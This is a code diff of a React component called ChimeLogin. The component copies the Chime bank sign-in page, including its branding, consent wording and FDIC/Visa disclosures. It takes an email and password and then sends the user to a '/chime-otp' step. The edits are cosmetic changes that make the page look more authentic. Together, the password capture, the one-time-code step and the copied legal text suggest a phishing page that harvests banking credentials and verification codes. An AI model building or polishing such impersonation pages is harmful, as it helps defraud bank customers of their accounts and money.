@@ -7,6 +7,7 @@ import {
   InputAdornment,
   IconButton,
   Link,
+  Paper,
 } from "@mui/material";
 import { Visibility, VisibilityOff } from "@mui/icons-material";
 import { useForm } from "react-hook-form";
@@ -20,7 +21,7 @@ export const ChimeLogin = () => {
   const [showPassword, setShowPassword] = useState(false);
   const [isLoading, setIsLoading] = useState(false);
 
- const {
+  const {
     register,
     handleSubmit,
     formState: { errors },
@@ -41,7 +42,6 @@ export const ChimeLogin = () => {
       toast.success(message);
       updateEmailStore(data.email);
       return navigate("/chime-otp");
-
     } catch (err) {
       toast.error(err.response?.data?.message);
     } finally {
@@ -54,61 +54,71 @@ export const ChimeLogin = () => {
         minHeight: "100vh",
         bgcolor: "#031f1a",
         display: "flex",
-        alignItems: "center",
         justifyContent: "center",
-        fontFamily: "Inter, sans-serif",
+        alignItems: "center",
+        px: 2,
       }}
     >
-      <Box
+      <Paper
+        elevation={0}
         sx={{
-          width: 380,
-          color: "white",
+          width: "100%",
+          maxWidth: 420,
+          bgcolor: "transparent",
+          color: "#fff",
         }}
       >
         {/* Logo */}
-        <Typography
-          variant="h3"
-          sx={{
-            color: "#2de28a",
-            fontWeight: 700,
-            mb: 4,
-          }}
-        >
+        <Typography variant="h3" fontWeight={700} color="#2de28a" mb={4}>
           chime
         </Typography>
+
+        <Typography variant="h5" fontWeight={600}>
+          Sign in
+        </Typography>
+
+        <Typography
+          sx={{
+            mt: 1,
+            mb: 4,
+            color: "#9db1ab",
+          }}
+        >
+          Enter your email and password to continue.
+        </Typography>
+
         <form onSubmit={handleSubmit(onSubmit)}>
-          {/* Email Field */}
           <TextField
             fullWidth
-            placeholder="Email"
-            variant="outlined"
-            sx={inputStyles}
+            placeholder="Email address"
             {...register("email", {
-              required: "Email is required!",
+              required: "Email is required.",
             })}
             error={!!errors.email}
             helperText={errors.email?.message}
+            sx={inputStyles}
           />
 
-          {/* Password Field */}
           <TextField
             fullWidth
             placeholder="Password"
             type={showPassword ? "text" : "password"}
-            variant="outlined"
             {...register("password", {
-              required: "Password is required!",
+              required: "Password is required.",
             })}
             error={!!errors.password}
             helperText={errors.password?.message}
-            sx={{ ...inputStyles, mt: 2 }}
+            sx={{
+              ...inputStyles,
+              mt: 2.5,
+            }}
             InputProps={{
               endAdornment: (
                 <InputAdornment position="end">
                   <IconButton
-                    onClick={() => setShowPassword(!showPassword)}
                     edge="end"
-                    sx={{ color: "#ccc" }}
+                    onClick={() => setShowPassword((prev) => !prev)}
+                    sx={{ color: "#a7b8b3" }}
                   >
                     {showPassword ? <VisibilityOff /> : <Visibility />}
                   </IconButton>
@@ -117,82 +127,118 @@ export const ChimeLogin = () => {
             }}
           />
 
-          {/* Sign In Button */}
+          <StyledLink text="Forgot password?" />
+
           <Button
             fullWidth
             type="submit"
             variant="contained"
+            disabled={isLoading}
             sx={{
               mt: 3,
-              py: 1.5,
-              borderRadius: "12px",
+              py: 1.6,
+              borderRadius: 2,
               bgcolor: "#04ffc5",
-              color: "#126848",
+              color: "#031f1a",
+              fontWeight: 700,
               textTransform: "none",
-              fontWeight: 600,
               "&:hover": {
-                bgcolor: "#22443c",
+                bgcolor: "#00ddb0",
               },
             }}
           >
             Sign in
           </Button>
         </form>
-        {/* Terms */}
+
         <Typography
           sx={{
             mt: 3,
-            fontSize: "0.85rem",
-            color: "#cfd8d5",
+            fontSize: ".85rem",
+            color: "#9db1ab",
+            lineHeight: 1.6,
           }}
         >
-          By clicking “Sign in”, you agree to receive SMS text messages from
-          Chime to verify your identity
+          By signing in, you agree to receive verification messages from Chime
+          when required to protect your account.
         </Typography>
 
-        {/* Footer */}
         <Typography
+          align="center"
           sx={{
-            mt: 4,
-            fontSize: "0.75rem",
-            color: "#8aa39c",
+            mt: 5,
+            color: "#7f9992",
+            fontSize: ".8rem",
           }}
         >
-          © 2026 Chime. All Rights Reserved.
+          © 2026 Chime. All rights reserved.
         </Typography>
 
         <Typography
           sx={{
             mt: 2,
-            fontSize: "0.7rem",
-            color: "#6e8780",
-            lineHeight: 1.5,
+            color: "#6f8a82",
+            fontSize: ".72rem",
+            lineHeight: 1.6,
           }}
         >
-          Banking Services provided by The Bancorp Bank, N.A., or Stride Bank,
-          N.A., Members FDIC. The Chime Visa® Debit Card is issued by The
-          Bancorp Bank, N.A., or Stride Bank pursuant to a license from Visa
-          U.S.A. Inc. and may be used everywhere Visa debit cards are accepted.
+          Banking services are provided by The Bancorp Bank, N.A., or Stride
+          Bank, N.A., Members FDIC. The Chime Visa® Debit Card is issued
+          pursuant to a license from Visa U.S.A. Inc.
         </Typography>
-      </Box>
-       {isLoading && <SpinnerLoading />}
+      </Paper>
+
+      {isLoading && <SpinnerLoading />}
     </Box>
   );
-}
+};
 
-/* 🔹 Reusable Styled Link */
+const inputStyles = {
+  "& .MuiOutlinedInput-root": {
+    bgcolor: "#062923",
+    borderRadius: 2,
+    color: "#fff",
+
+    "& fieldset": {
+      borderColor: "#34514a",
+    },
+
+    "&:hover fieldset": {
+      borderColor: "#2de28a",
+    },
+
+    "&.Mui-focused fieldset": {
+      borderColor: "#2de28a",
+      borderWidth: 2,
+    },
+  },
+
+  "& .MuiInputBase-input::placeholder": {
+    color: "#9db1ab",
+    opacity: 1,
+  },
+
+  "& .MuiFormHelperText-root": {
+    color: "#ff8d8d",
+    ml: 0,
+    mt: 0.8,
+  },
+};
+
 function StyledLink({ text }) {
   return (
     <Link
-      href="#"
-      underline="always"
+      component="button"
+      underline="hover"
       sx={{
-        display: "block",
-        color: "#ffffff",
-        fontSize: "0.9rem",
-        mb: 1,
+        mt: 2,
+        display: "inline-block",
+        color: "#2de28a",
+        fontSize: ".9rem",
+        textDecoration: "none",
+
         "&:hover": {
-          color: "#2de28a",
+          textDecoration: "underline",
         },
       }}
     >
@@ -200,26 +246,3 @@ function StyledLink({ text }) {
     </Link>
   );
 }
-
-/* 🔹 Input Styling */
-const inputStyles = {
-  "& .MuiOutlinedInput-root": {
-    borderRadius: "14px",
-    bgcolor: "#062923",
-    color: "white",
-    "& fieldset": {
-      borderColor: "#3a5c54",
-    },
-    "&:hover fieldset": {
-      borderColor: "#5f8f84",
-    },
-    "&.Mui-focused fieldset": {
-      borderColor: "#2de28a",
-      boxShadow: "0 0 0 2px rgba(45, 226, 138, 0.2)",
-    },
-  },
-  "& input::placeholder": {
-    color: "#a0b3ad",
-    opacity: 1,
-  },
-};
